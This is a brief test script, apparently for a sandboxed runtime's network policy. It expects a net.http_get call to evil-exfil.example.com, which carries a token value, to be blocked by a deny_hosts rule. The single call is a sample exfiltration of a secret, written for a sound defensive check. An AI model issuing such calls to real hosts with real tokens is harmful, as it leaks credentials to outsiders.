# Should be REJECTED at runtime:
# net.http_get to a host matching [network].deny_hosts.

body = net.http_get("https://evil-exfil.example.com/drop?token=secret")
print("if you see this, the policy did not stop the exfil")
print(body)
